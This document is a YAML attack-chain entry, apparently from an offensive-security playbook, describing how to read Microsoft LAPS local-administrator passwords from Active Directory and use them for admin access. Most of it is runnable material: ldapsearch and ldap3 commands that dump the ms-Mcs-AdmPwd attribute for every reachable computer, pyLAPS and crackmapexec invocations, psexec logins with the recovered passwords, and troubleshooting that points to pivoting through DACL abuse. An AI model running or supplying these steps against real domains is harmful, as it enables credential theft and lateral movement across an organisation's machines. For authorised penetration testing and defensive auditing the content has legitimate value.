chain_id: laps_password_read
title: "AD — LAPS password read (ms-Mcs-AdmPwd) → local admin on target host"
severity: HIGH
tags: [ad, laps, ms-mcs-admpwd, ldap, dacl-abuse, post-exploit]

trigger:
  any_of:
    - { kind: "laps_read_rights" }
    - { kind: "domain_user_credentials" }

description: |
  Microsoft LAPS (Local Administrator Password Solution) stores each
  Windows host's local admin password in clear text inside the
  computer object's `ms-Mcs-AdmPwd` attribute (legacy LAPS) or
  `msLAPS-Password` (Windows LAPS, encrypted by default). Any
  principal with read access on those attributes — typically tier-1
  helpdesk groups, or whoever shipped that GPO — can pull the local
  admin of every machine they cover. Mass-deployed across every
  enterprise; ACLs frequently over-broad.

steps:
  - id: 1
    title: "Detect LAPS deployment"
    command: |
      # Any computer with the attribute populated:
      ldapsearch -x -H ldap://$DC_IP -D 'USER@DOMAIN' -w 'PASS' \
        -b 'DC=DOMAIN,DC=LOCAL' '(ms-Mcs-AdmPwdExpirationTime=*)' ms-Mcs-AdmPwd | head
      # Or BloodHound: nodes with `LAPS=true` property.

  - id: 2
    title: "Read every LAPS password you can"
    command: |
      python3 -c "
      from ldap3 import Server, Connection, ALL
      s=Server('$DC_IP', get_info=ALL)
      c=Connection(s, user='DOMAIN\\\\USER', password='PASS', auto_bind=True)
      c.search('DC=DOMAIN,DC=LOCAL', '(ms-Mcs-AdmPwd=*)', attributes=['cn','ms-Mcs-AdmPwd'])
      for e in c.entries: print(e.cn, '->', e['ms-Mcs-AdmPwd'])
      "

  - id: 3
    title: "With pyLAPS / netexec"
    command: |
      git clone https://github.com/p0dalirius/pyLAPS /tmp/laps
      python3 /tmp/laps/pyLAPS.py --action get -u USER -p 'PASS' -d DOMAIN -dc-ip $DC_IP
      crackmapexec ldap $DC_IP -u USER -p 'PASS' -M laps

  - id: 4
    title: "Use the recovered local admin password"
    command: |
      crackmapexec smb TARGET.DOMAIN -u Administrator -p '<LAPS_pwd>' --local-auth
      impacket-psexec Administrator:'<LAPS_pwd>'@TARGET.DOMAIN

  - id: 5
    title: "Windows LAPS variant — encrypted attribute, decrypt via DPAPI"
    command: |
      # Windows LAPS uses msLAPS-EncryptedPassword; needs DPAPI cred
      # of the principal scoped to read. With a domain admin shell:
      Get-LapsADPassword -Identity TARGET -AsPlainText

common_errors:
  - error: "ms-Mcs-AdmPwd attribute is empty"
    solution: |
      No LAPS deployed (or migrated to Windows LAPS — check
      `msLAPS-Password`). If Windows LAPS, you need a principal in
      the decrypt group AND the DPAPI keys; bare LDAP read is no
      longer enough.
  - error: "LDAP returns 0 entries even with bind"
    solution: |
      Confidentiality bit set on the attribute (default after
      Server 2019). Need explicit `Control_Access` right. BloodHound
      shows this as `ReadLAPSPassword` edge — pivot via DACL abuse.

references:
  - https://www.thehacker.recipes/ad/movement/credentials/dumping/laps
  - https://github.com/p0dalirius/pyLAPS
